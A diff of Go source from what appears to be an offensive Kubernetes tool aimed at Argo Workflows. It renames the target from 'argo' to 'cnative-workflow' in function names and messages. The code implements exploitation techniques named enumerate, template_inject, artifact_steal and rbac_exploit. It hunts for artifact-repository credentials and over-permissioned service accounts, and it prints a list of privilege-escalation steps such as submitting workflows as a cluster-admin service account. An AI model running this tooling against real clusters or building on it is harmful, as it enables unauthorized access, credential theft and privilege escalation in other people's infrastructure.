@@ -11,19 +11,19 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var argoWorkflowTemplateGVR = schema.GroupVersionResource{
+var cnativeWorkflowTemplateGVR = schema.GroupVersionResource{
 	Group: "argoproj.io", Version: "v1alpha1", Resource: "workflowtemplates",
 }
 
-var argoClusterWorkflowTemplateGVR = schema.GroupVersionResource{
+var cnativeWorkflowClusterTemplateGVR = schema.GroupVersionResource{
 	Group: "argoproj.io", Version: "v1alpha1", Resource: "clusterworkflowtemplates",
 }
 
-var argoWorkflowGVR = schema.GroupVersionResource{
+var cnativeWorkflowGVR = schema.GroupVersionResource{
 	Group: "argoproj.io", Version: "v1alpha1", Resource: "workflows",
 }
 
-func detectArgoWorkflows(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeWorkflow(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"argo", "argo-workflows", "argo-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -31,7 +31,7 @@ func detectArgoWorkflows(ctx context.Context, client kubernetes.Interface) []Det
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "argo-workflows",
+				Name:      "cnative-workflow",
 				Detected:  true,
 				Namespace: ns,
 				Details:   fmt.Sprintf("%d workflow-controller pods", len(pods.Items)),
@@ -43,7 +43,7 @@ func detectArgoWorkflows(ctx context.Context, client kubernetes.Interface) []Det
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "argo-workflows",
+				Name:      "cnative-workflow",
 				Detected:  true,
 				Namespace: ns,
 				Details:   fmt.Sprintf("argo-server in %s", ns),
@@ -54,29 +54,29 @@ func detectArgoWorkflows(ctx context.Context, client kubernetes.Interface) []Det
 	return nil
 }
 
-// ExploitArgoWorkflows executes the specified Argo Workflows exploitation technique.
-func ExploitArgoWorkflows(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeWorkflow executes the specified cnative-workflow exploitation technique.
+func ExploitCnativeWorkflow(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return argoEnumerate(ctx, client, dynClient)
+		return cnativeWorkflowEnumerate(ctx, client, dynClient)
 	case "template_inject":
-		return argoTemplateInject(ctx, dynClient)
+		return cnativeWorkflowTemplateInject(ctx, dynClient)
 	case "artifact_steal":
-		return argoArtifactSteal(ctx, client, dynClient)
+		return cnativeWorkflowArtifactSteal(ctx, client, dynClient)
 	case "rbac_exploit":
-		return argoRBACExploit(ctx, client)
+		return cnativeWorkflowRBACExploit(ctx, client)
 	default:
-		return argoEnumerate(ctx, client, dynClient)
+		return cnativeWorkflowEnumerate(ctx, client, dynClient)
 	}
 }
 
-func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeWorkflowEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Argo Workflows Enumeration:\n\n")
+	sb.WriteString("cnative-workflow Enumeration:\n\n")
 
 	found := false
 
-	templates, err := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	templates, err := dynClient.Resource(cnativeWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(templates.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  WorkflowTemplates (%d):\n", len(templates.Items))
@@ -86,7 +86,7 @@ func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient d
 		sb.WriteString("\n")
 	}
 
-	clusterTemplates, err := dynClient.Resource(argoClusterWorkflowTemplateGVR).List(ctx, metav1.ListOptions{})
+	clusterTemplates, err := dynClient.Resource(cnativeWorkflowClusterTemplateGVR).List(ctx, metav1.ListOptions{})
 	if err == nil && len(clusterTemplates.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  ClusterWorkflowTemplates (%d):\n", len(clusterTemplates.Items))
@@ -96,7 +96,7 @@ func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient d
 		sb.WriteString("\n")
 	}
 
-	workflows, err := dynClient.Resource(argoWorkflowGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	workflows, err := dynClient.Resource(cnativeWorkflowGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(workflows.Items) > 0 {
 		found = true
 		running := 0
@@ -121,7 +121,7 @@ func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient d
 	}
 
 	if !found {
-		sb.WriteString("  No Argo Workflows resources detected\n")
+		sb.WriteString("  No cnative-workflow resources detected\n")
 	}
 
 	return &EvasionResult{
@@ -131,14 +131,14 @@ func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient d
 	}, nil
 }
 
-func argoTemplateInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeWorkflowTemplateInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Argo Workflow Template Injection:\n\n")
+	sb.WriteString("cnative-workflow Template Injection:\n\n")
 
 	sb.WriteString("  WorkflowTemplates define reusable workflow steps.\n")
 	sb.WriteString("  Injecting privileged containers into templates achieves persistent code execution.\n\n")
 
-	templates, err := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	templates, err := dynClient.Resource(cnativeWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list WorkflowTemplates: %v\n", err)
 		return &EvasionResult{Technique: "template_inject", Success: false, Output: sb.String()}, nil
@@ -178,7 +178,7 @@ func argoTemplateInject(ctx context.Context, dynClient dynamic.Interface) (*Evas
 		sb.WriteString("\n")
 	}
 
-	clusterTemplates, _ := dynClient.Resource(argoClusterWorkflowTemplateGVR).List(ctx, metav1.ListOptions{})
+	clusterTemplates, _ := dynClient.Resource(cnativeWorkflowClusterTemplateGVR).List(ctx, metav1.ListOptions{})
 	if clusterTemplates != nil && len(clusterTemplates.Items) > 0 {
 		fmt.Fprintf(&sb, "  ClusterWorkflowTemplates (cluster-wide, %d):\n", len(clusterTemplates.Items))
 		for _, tmpl := range clusterTemplates.Items {
@@ -202,11 +202,11 @@ func argoTemplateInject(ctx context.Context, dynClient dynamic.Interface) (*Evas
 	}, nil
 }
 
-func argoArtifactSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeWorkflowArtifactSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Argo Workflows Artifact Repository Theft:\n\n")
+	sb.WriteString("cnative-workflow Artifact Repository Theft:\n\n")
 
-	sb.WriteString("  Argo stores workflow artifacts (inputs/outputs) in S3/GCS/Minio.\n")
+	sb.WriteString("  cnative-workflow stores artifacts (inputs/outputs) in S3/GCS/Minio.\n")
 	sb.WriteString("  Artifact repository credentials give access to all workflow data.\n\n")
 
 	namespaces := []string{"argo", "argo-workflows", "argo-system"}
@@ -243,7 +243,7 @@ func argoArtifactSteal(ctx context.Context, client kubernetes.Interface, dynClie
 		}
 	}
 
-	templates, _ := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	templates, _ := dynClient.Resource(cnativeWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if templates != nil {
 		for _, tmpl := range templates.Items {
 			spec, _ := tmpl.Object["spec"].(map[string]any)
@@ -267,11 +267,11 @@ func argoArtifactSteal(ctx context.Context, client kubernetes.Interface, dynClie
 	}, nil
 }
 
-func argoRBACExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeWorkflowRBACExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Argo Workflows RBAC Exploitation:\n\n")
+	sb.WriteString("cnative-workflow RBAC Exploitation:\n\n")
 
-	sb.WriteString("  Argo workflow pods run under service accounts with varying permissions.\n")
+	sb.WriteString("  cnative-workflow pods run under service accounts with varying permissions.\n")
 	sb.WriteString("  Over-permissioned SAs allow escalation from within workflow steps.\n\n")
 
 	namespaces := []string{"argo", "argo-workflows", "argo-system"}
@@ -305,24 +305,24 @@ func argoRBACExploit(ctx context.Context, client kubernetes.Interface) (*Evasion
 
 	roleBindings, err := client.RbacV1().RoleBindings("").List(ctx, metav1.ListOptions{})
 	if err == nil {
-		argoBindings := 0
+		cnativeWorkflowBindings := 0
 		for _, rb := range roleBindings.Items {
 			if strings.Contains(rb.Name, "argo") || strings.Contains(rb.Name, "workflow") {
-				argoBindings++
-				if argoBindings <= 5 {
+				cnativeWorkflowBindings++
+				if cnativeWorkflowBindings <= 5 {
 					fmt.Fprintf(&sb, "\n  RoleBinding: %s/%s → %s\n", rb.Namespace, rb.Name, rb.RoleRef.Name)
 				}
 			}
 		}
-		if argoBindings > 5 {
-			fmt.Fprintf(&sb, "  ... and %d more argo-related RoleBindings\n", argoBindings-5)
+		if cnativeWorkflowBindings > 5 {
+			fmt.Fprintf(&sb, "  ... and %d more cnative-workflow RoleBindings\n", cnativeWorkflowBindings-5)
 		}
 	}
 
 	sb.WriteString("\n  RBAC exploitation techniques:\n")
 	sb.WriteString("    1. Workflow default SA often has pod create/delete (can spawn privileged)\n")
 	sb.WriteString("    2. Submit workflow with serviceAccountName: cluster-admin SA\n")
-	sb.WriteString("    3. Use Argo's artifact GC SA — often has broad secret access\n")
+	sb.WriteString("    3. Use cnative-workflow's artifact GC SA — often has broad secret access\n")
 	sb.WriteString("    4. workflow-controller SA typically has cluster-wide pod management\n")
 	sb.WriteString("    5. Submit workflow that mounts SA tokens from other namespaces\n")
 	sb.WriteString("    6. Exploit templateRef to run ClusterWorkflowTemplate as elevated SA\n")
